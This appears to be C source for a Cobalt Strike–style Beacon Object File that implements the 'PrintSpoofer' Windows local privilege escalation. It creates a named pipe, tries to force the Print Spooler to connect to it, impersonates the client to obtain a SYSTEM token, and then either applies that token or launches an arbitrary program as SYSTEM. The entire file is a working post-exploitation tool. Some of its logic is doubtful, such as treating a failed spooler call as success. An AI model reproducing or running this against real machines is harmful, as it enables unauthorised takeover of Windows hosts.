#include <windows.h>
#include <stdio.h>
#include "bofdefs.h"

// Global variable for token mode
DWORD token_mode __attribute__((section (".data"))) = 0;

BOOL IsTokenSystem(HANDLE hToken)
{
    DWORD dwLength = 0;
    PTOKEN_USER user;
    LPWSTR sid_name;
    SECURITY_IMPERSONATION_LEVEL ImpersonationLevel = SecurityAnonymous;
    DWORD Size;
    wchar_t* impersonationLevelstr = NULL;
    
    ADVAPI32$GetTokenInformation(hToken, TokenUser, NULL, dwLength, &dwLength);
    if (KERNEL32$GetLastError() == ERROR_INSUFFICIENT_BUFFER)
    {
        user = (PTOKEN_USER)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, dwLength);
        if (user == NULL)
        {
            KERNEL32$CloseHandle(hToken);
            return FALSE;
        }
    }
    
    if (ADVAPI32$GetTokenInformation(hToken, TokenUser, user, dwLength, &dwLength))
    {
        ADVAPI32$ConvertSidToStringSidW(user->User.Sid, &sid_name);
    }
    else
    {
        BeaconPrintf(CALLBACK_ERROR, "Error getting token user %d\n", KERNEL32$GetLastError());
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, user);
        return FALSE;
    }
    
    Size = 0;
    ADVAPI32$GetTokenInformation(hToken, TokenImpersonationLevel, &ImpersonationLevel, sizeof(SECURITY_IMPERSONATION_LEVEL), &Size);
    
    switch (ImpersonationLevel)
    {
    case SecurityAnonymous:
        impersonationLevelstr = (wchar_t*)L"Anonymous"; break;
    case SecurityIdentification:
        impersonationLevelstr = (wchar_t*)L"Identification"; break;
    case SecurityImpersonation:
        impersonationLevelstr = (wchar_t*)L"Impersonation"; break;
    case SecurityDelegation:
        impersonationLevelstr = (wchar_t*)L"Delegation"; break;
    }
    
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, user);
    
    if (!MSVCRT$wcscmp(sid_name, L"S-1-5-18") && ImpersonationLevel >= SecurityImpersonation)
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Obtained SYSTEM (%ls) token with impersonation level: %S\n", sid_name, impersonationLevelstr);
        return TRUE;
    }
    else
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Obtained (%ls) token with impersonation level: %S\n", sid_name, impersonationLevelstr);
        return FALSE;
    }
}

// Create Named Pipe
HANDLE CreateNamedPipeA_Custom(LPCSTR lpName)
{
    HANDLE hPipe = KERNEL32$CreateNamedPipeA(
        lpName,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_WAIT,
        10,
        2048,
        2048,
        0,
        NULL
    );
    
    if (hPipe == INVALID_HANDLE_VALUE)
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] CreateNamedPipe failed. Error: %d\n", KERNEL32$GetLastError());
        return INVALID_HANDLE_VALUE;
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Named Pipe created: %s\n", lpName);
    return hPipe;
}

// Trigger Print Spooler connection
BOOL TriggerNamedPipeConnection(LPCSTR lpName)
{
    WCHAR lpPrinterName[MAX_PATH];
    WCHAR lpPortName[MAX_PATH];
    
    // Convert pipe name to wide string
    int len = MSVCRT$strlen(lpName);
    MSVCRT$mbstowcs(lpPrinterName, lpName, len + 1);
    
    // Create port name
    MSVCRT$swprintf(lpPortName, MAX_PATH, L"%s", lpPrinterName);
    
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Triggering named pipe connection via Print Spooler...\n");
    
    // Try to add a printer port - this will cause Print Spooler to connect
    // We use XcvDataW to interact with the port monitor
    HANDLE hPrinter = NULL;
    PRINTER_DEFAULTS pd = { 0 };
    pd.DesiredAccess = SERVER_ACCESS_ADMINISTER;
    
    if (WINSPOOL$OpenPrinterW(L",XcvMonitor Local Port", &hPrinter, &pd))
    {
        DWORD dwNeeded, dwStatus;
        BYTE output[4096];
        
        // Add port using XcvData
        DWORD result = WINSPOOL$XcvDataW(
            hPrinter,
            L"AddPort",
            (PBYTE)lpPortName,
            (MSVCRT$wcslen(lpPortName) + 1) * sizeof(WCHAR),
            output,
            sizeof(output),
            &dwNeeded,
            &dwStatus
        );
        
        WINSPOOL$ClosePrinter(hPrinter);
        
        if (result == ERROR_SUCCESS || dwStatus == ERROR_SUCCESS)
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Triggered Print Spooler connection\n");
            return TRUE;
        }
        else
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] XcvDataW returned: %d, status: %d (This is often expected)\n", result, dwStatus);
            // Even if this fails, the connection might have been triggered
            return TRUE;
        }
    }
    else
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenPrinter failed. Error: %d\n", KERNEL32$GetLastError());
        return FALSE;
    }
}

// Wait for connection and impersonate
BOOL WaitForConnection(HANDLE hPipe, DWORD timeout)
{
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Waiting for connection (timeout: %d ms)...\n", timeout);
    
    OVERLAPPED overlapped = { 0 };
    overlapped.hEvent = KERNEL32$CreateEventA(NULL, TRUE, FALSE, NULL);
    
    if (overlapped.hEvent == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] CreateEvent failed. Error: %d\n", KERNEL32$GetLastError());
        return FALSE;
    }
    
    BOOL result = KERNEL32$ConnectNamedPipe(hPipe, &overlapped);
    DWORD dwError = KERNEL32$GetLastError();
    
    if (!result)
    {
        if (dwError == ERROR_IO_PENDING)
        {
            DWORD dwWait = KERNEL32$WaitForSingleObject(overlapped.hEvent, timeout);
            if (dwWait == WAIT_TIMEOUT)
            {
                BeaconPrintf(CALLBACK_ERROR, "[-] Timeout waiting for connection\n");
                KERNEL32$CloseHandle(overlapped.hEvent);
                return FALSE;
            }
            else if (dwWait == WAIT_OBJECT_0)
            {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Client connected!\n");
            }
            else
            {
                BeaconPrintf(CALLBACK_ERROR, "[-] WaitForSingleObject failed. Error: %d\n", KERNEL32$GetLastError());
                KERNEL32$CloseHandle(overlapped.hEvent);
                return FALSE;
            }
        }
        else if (dwError == ERROR_PIPE_CONNECTED)
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Client already connected!\n");
        }
        else
        {
            BeaconPrintf(CALLBACK_ERROR, "[-] ConnectNamedPipe failed. Error: %d\n", dwError);
            KERNEL32$CloseHandle(overlapped.hEvent);
            return FALSE;
        }
    }
    
    KERNEL32$CloseHandle(overlapped.hEvent);
    return TRUE;
}

#ifdef BOF
void go(char* args, int len)
{
    datap parser;
    int use_token = 0;
    LPWSTR run_program = NULL;
    
    BeaconDataParse(&parser, args, len);
    use_token = BeaconDataInt(&parser);
    run_program = (LPWSTR)BeaconDataExtract(&parser, NULL);
    
    if ((use_token && run_program[0] != L'\0') || (!use_token && run_program[0] == L'\0'))
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] Use only --token or --run\n");
        return;
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[*] PrintSpoofer - Local Privilege Escalation\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Technique: Named Pipe Impersonation via Print Spooler\n\n");
    
    // Generate random pipe name
    CHAR pipeName[MAX_PATH];
    DWORD randomValue;
    ADVAPI32$SystemFunction036(&randomValue, sizeof(randomValue));  // RtlGenRandom
    MSVCRT$sprintf(pipeName, "\\\\.\\pipe\\printspoof%08x", randomValue);
    
    // Create Named Pipe
    HANDLE hPipe = CreateNamedPipeA_Custom(pipeName);
    if (hPipe == INVALID_HANDLE_VALUE)
    {
        return;
    }
    
    // Trigger Print Spooler connection
    if (!TriggerNamedPipeConnection(pipeName))
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to trigger connection\n");
        KERNEL32$CloseHandle(hPipe);
        return;
    }
    
    // Wait for connection (5 seconds timeout)
    if (!WaitForConnection(hPipe, 5000))
    {
        KERNEL32$CloseHandle(hPipe);
        return;
    }
    
    // Impersonate the connected client
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Attempting to impersonate client...\n");
    if (!ADVAPI32$ImpersonateNamedPipeClient(hPipe))
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] ImpersonateNamedPipeClient failed. Error: %d\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hPipe);
        return;
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Impersonation successful!\n");
    
    // Get current thread token
    HANDLE hToken = NULL;
    if (!ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken))
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenThreadToken failed. Error: %d\n", KERNEL32$GetLastError());
        ADVAPI32$RevertToSelf();
        KERNEL32$CloseHandle(hPipe);
        return;
    }
    
    // Check if it's a SYSTEM token
    BOOL isSystem = IsTokenSystem(hToken);
    
    if (!isSystem)
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to obtain SYSTEM token\n");
        KERNEL32$CloseHandle(hToken);
        ADVAPI32$RevertToSelf();
        KERNEL32$CloseHandle(hPipe);
        return;
    }
    
    // Duplicate token to primary
    HANDLE hPrimaryToken = NULL;
    if (!ADVAPI32$DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimaryToken))
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] DuplicateTokenEx failed. Error: %d\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hToken);
        ADVAPI32$RevertToSelf();
        KERNEL32$CloseHandle(hPipe);
        return;
    }
    
    if (use_token)
    {
        // Apply token to current thread
        if (!ADVAPI32$SetThreadToken(NULL, hToken))
        {
            BeaconPrintf(CALLBACK_ERROR, "[-] SetThreadToken failed. Error: %d\n", KERNEL32$GetLastError());
        }
        else
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] SYSTEM token applied to current thread!\n");
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Impersonate to SYSTEM succeeded\n");
        }
    }
    else
    {
        // Run program with SYSTEM token
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Starting process: %ls\n", run_program);
        
        STARTUPINFOW si = { 0 };
        PROCESS_INFORMATION pi = { 0 };
        si.cb = sizeof(si);
        
        if (!ADVAPI32$CreateProcessWithTokenW(
            hPrimaryToken,
            LOGON_WITH_PROFILE,
            NULL,
            run_program,
            0,
            NULL,
            NULL,
            &si,
            &pi))
        {
            BeaconPrintf(CALLBACK_ERROR, "[-] CreateProcessWithTokenW failed. Error: %d\n", KERNEL32$GetLastError());
        }
        else
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Process created with PID: %d\n", pi.dwProcessId);
            KERNEL32$CloseHandle(pi.hProcess);
            KERNEL32$CloseHandle(pi.hThread);
        }
    }
    
    // Cleanup
    KERNEL32$CloseHandle(hPrimaryToken);
    KERNEL32$CloseHandle(hToken);
    if (!use_token)
    {
        ADVAPI32$RevertToSelf();
    }
    KERNEL32$CloseHandle(hPipe);
    
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] PrintSpoofer completed\n");
}
#endif

